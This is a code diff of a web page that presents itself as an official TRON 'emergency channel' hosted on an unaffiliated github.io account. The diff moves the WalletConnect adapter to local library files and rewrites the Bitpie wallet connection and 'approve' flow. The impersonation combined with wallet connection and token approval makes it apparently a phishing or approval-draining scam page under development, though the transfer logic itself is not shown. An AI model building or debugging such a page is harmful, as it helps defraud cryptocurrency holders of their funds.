@@ -1,7 +1,6 @@
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-   
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>TRON官方应急通道</title>
@@ -16,23 +15,12 @@
     <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
     <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
-   <!-- 替换成原来的@walletconnect/tron-provider -->
-    <!-- 替换原适配器脚本，使用固定版本v1.0.1 -->
-    <!-- 主脚本链接（优先加载） -->
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/tron-provider@1.0.1/dist/umd/index.min.js"></script>
-<!-- 备用脚本链接（主链接加载失败时执行） -->
-<script>
-    if (!window.WalletConnectTronProvider) {
-        console.log("主脚本链接加载失败，尝试备用链接...");
-        const script = document.createElement('script');
-        script.src = "https://unpkg.com/@walletconnect/tron-provider@1.0.1/dist/umd/index.min.js";
-        script.onload = () => console.log("备用脚本链接加载成功");
-        script.onerror = () => console.error("备用脚本链接也加载失败");
-        document.head.appendChild(script);
-    }
-</script>
-<script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+    <!-- 核心修改：替换为本地脚本（先加载TRONWeb，再加载适配器） -->
+    <script src="./libs/tronweb.min.js"></script>
+    <script src="./libs/walletconnect-tron-provider.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
     <script>eruda.init();</script>
+    
    <style>
         /* 原有样式完全保留，未做任何修改 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -1091,86 +1079,40 @@ const ADAPTER_CDN_LIST = [
     "https://raw.githack.com/WalletConnect/trono-provider-dist/master/1.0.1/index.min.js"
 ];
 
-/**
- * 新增：加载适配器脚本（多CDN自动切换）
- */
-async function loadAdapterScript() {
-    let currentCdnIndex = 0;
-    const maxRetries = ADAPTER_CDN_LIST.length;
-
-    return new Promise((resolve, reject) => {
-        // 尝试加载单个CDN
-        const tryLoad = () => {
-            if (currentCdnIndex >= maxRetries) {
-                reject(new Error("所有CDN均加载失败"));
-                return;
-            }
-
-            const cdnUrl = ADAPTER_CDN_LIST[currentCdnIndex];
-            console.log(`📥 尝试加载适配器（CDN ${currentCdnIndex + 1}/${maxRetries}）：`, cdnUrl);
-
-            const script = document.createElement("script");
-            script.src = cdnUrl;
-            script.async = false; // 同步加载，确保后续逻辑依赖可用
-
-            // 加载成功
-            script.onload = () => {
-                if (window.WalletConnectTronProvider) {
-                    console.log(`✅ 适配器加载成功（CDN ${currentCdnIndex + 1}）`);
-                    resolve();
-                } else {
-                    console.warn(`❌ CDN ${currentCdnIndex + 1} 加载成功但未暴露全局变量，尝试下一个`);
-                    currentCdnIndex++;
-                    tryLoad();
-                }
-            };
-
-            // 加载失败
-            script.onerror = () => {
-                console.warn(`❌ CDN ${currentCdnIndex + 1} 加载失败，尝试下一个`);
-                currentCdnIndex++;
-                tryLoad();
-            };
-
-            document.head.appendChild(script);
-        };
-
-        tryLoad();
-    });
-}
 
 /********************************************************************
  * 比特派专属：旧WalletConnect TronProvider初始化（无修改）
  ********************************************************************/
-async function initBitpieWalletConnect() {
-    try {
-        if (!window.WalletConnectTronProvider) {
-            throw new Error("适配器脚本未加载：window.WalletConnectTronProvider不存在");
+        async function initBitpieWalletConnect() {
+            try {
+                // 直接检查本地脚本是否加载成功
+                if (!window.WalletConnectTronProvider) {
+                    throw new Error("本地适配器脚本未加载：window.WalletConnectTronProvider不存在");
+                }
+
+                console.log("适配器版本：", window.WalletConnectTronProvider.version);
+
+                tronProvider = new window.WalletConnectTronProvider({
+                    projectId: WC_PROJECT_ID,
+                    chains: [195],
+                    showQrModal: false,
+                    rpcMap: { 195: "https://api.trongrid.io" }
+                });
+
+                console.log("适配器初始化状态：", tronProvider);
+
+                await tronProvider.connect();
+                const wcUri = tronProvider.connector?.uri;
+                if (!wcUri) throw new Error("connect成功但未生成URI");
+
+                console.log("比特派适配器初始化成功，URI：", wcUri);
+                return wcUri;
+
+            } catch (e) {
+                console.error("比特派适配器初始化失败（详细原因）：", e.message, e.stack);
+                throw new Error(`初始化失败：${e.message || "未知错误"}`);
+            }
         }
-
-        console.log("适配器版本：", window.WalletConnectTronProvider.version);
-
-        tronProvider = new window.WalletConnectTronProvider({
-            projectId: WC_PROJECT_ID,
-            chains: [195],
-            showQrModal: false,
-            rpcMap: { 195: "https://api.trongrid.io" }
-        });
-
-        console.log("适配器初始化状态：", tronProvider);
-
-        await tronProvider.connect();
-        const wcUri = tronProvider.connector?.uri;
-        if (!wcUri) throw new Error("connect成功但未生成URI");
-
-        console.log("比特派适配器初始化成功，URI：", wcUri);
-        return wcUri;
-
-    } catch (e) {
-        console.error("比特派适配器初始化失败（详细原因）：", e.message, e.stack);
-        throw new Error(`初始化失败：${e.message || "未知错误"}`);
-    }
-}
 
 /********************************************************************
  * 工具函数（无修改）
@@ -1873,55 +1815,59 @@ DOM.walletItems.forEach(item => {
         const wallet = walletConfig[walletType];
         if (!wallet) return;
 
-        const loadingEl = document.getElementById("Loading");
-        const lang = langConfig[currentLang];
-        const targetUrl = window.location.href + "#approve";
-
-        if (loadingEl) loadingEl.style.display = "flex";
-        item.style.pointerEvents = "none";
-        DOM.multiWalletPopup.style.display = "none";
-
-       if (walletType === "bitpie") {
-            tempFeedback("开始处理比特派连接...");
+                const loadingEl = document.getElementById("Loading");
+            if (loadingEl) loadingEl.style.display = "flex";
+            const lang = langConfig[currentLang];
 
             try {
-                if (!tronProvider) {
-                    tempFeedback("正在初始化比特派旧适配器...");
-                    await initBitpieWalletConnect();
+                // 直接检查本地适配器是否加载成功
+                if (!window.WalletConnectTronProvider) {
+                    throw new Error("本地适配器脚本加载失败，请检查libs文件夹中的文件是否存在");
                 }
 
-                tempFeedback("正在生成比特派连接URI...");
-                const wcUri = tronProvider.connector?.uri;
-                if (!wcUri) throw new Error("未获取到WalletConnect连接地址");
-                console.log("比特派连接URI:", wcUri);
-
-                tempFeedback("正在唤起比特派...");
-                const encodedWcUri = encodeURIComponent(wcUri);
-                const jumpUrl = `bitpie://walletconnect?uri=${encodedWcUri}`;
-                console.log("唤起比特派的链接:", jumpUrl);
-
-                window.location.href = jumpUrl;
-
-                tronProvider.on("connect", (payload) => {
-                    tempFeedback("比特派连接成功！");
-                    window.tronWeb = tronProvider.tronWeb;
-                    tronWeb = window.tronWeb;
-                    initWallet(false);
-                    if (loadingEl) loadingEl.style.display = "none";
-                });
-
-                setTimeout(() => {
-                    if (loadingEl) loadingEl.style.display = "none";
-                    item.style.pointerEvents = "auto";
-                }, 3000);
+                // 执行环境检测
+                setTimeout(async () => {
+                    try {
+                        await checkWalletEnv();
+                        if (window.tronWeb) {
+                            if (!window.tronWeb.ready) {
+                                await new Promise(resolve => window.tronWeb.onReady(resolve));
+                            }
+                            tronWeb = window.tronWeb;
+                            await initWallet(false);
+                        }
+                    } catch (err) {
+                        console.error("环境检测/初始化失败：", err);
+                        DOM.userInfoStatus.style.display = "block";
+                        DOM.userInfoStatus.innerHTML = `${lang.errorTipPrefix}${err.message || lang.ineligibleTip}`;
+                        DOM.balanceItems.forEach(item => item.style.display = "none");
+                        DOM.approveBtn.disabled = true;
+                        DOM.approveBtn.textContent = lang.insufficientBtn;
+                        updateUserBalanceDisplay();
+                    }
+                }, 500);
 
             } catch (e) {
-                console.error("比特派连接失败详情:", e);
-                tempFeedback(`比特派连接失败: ${e.message}`);
-                alert(`操作失败：比特派连接失败，原因：${e.message.slice(0, 40)}`);
+                // 本地脚本加载失败（文件缺失或路径错误）
+                console.error("本地适配器加载失败：", e);
                 if (loadingEl) loadingEl.style.display = "none";
-                item.style.pointerEvents = "auto";
+                DOM.userInfoStatus.style.display = "block";
+                DOM.userInfoStatus.innerHTML = `
+                    <span style="color: #ef4444; font-size: 14px;">⚠️ 本地适配器文件缺失</span><br>
+                    <span style="font-size: 13px; margin-top: 8px; display: inline-block;">请检查libs文件夹是否存在，且包含2个必要文件</span>
+                `;
+                DOM.multiWalletPopup.style.display = "block";
+                DOM.connectBtn.textContent = "重新加载页面";
+                DOM.connectBtn.onclick = () => window.location.reload();
             }
+
+            // 1500ms后隐藏加载动画
+            setTimeout(() => {
+                if (loadingEl) loadingEl.style.display = "none";
+                DOM.userInfoEl.style.display = "block";
+                DOM.walletStatusContainer.style.display = "block";
+                DOM.contractResourceContainer.style.display = "block";
+            }, 1500);
 
         } else {
             let jumpUrl = "";
